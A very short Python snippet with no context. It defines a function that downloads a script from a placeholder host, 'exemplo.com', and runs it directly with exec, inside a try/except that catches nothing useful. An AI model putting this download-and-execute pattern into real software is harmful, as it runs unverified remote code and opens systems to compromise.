import requests

try:
    def f():
        r = requests.get("http://exemplo.com/script.py")
        exec(r.text)
except Exception:
    pass
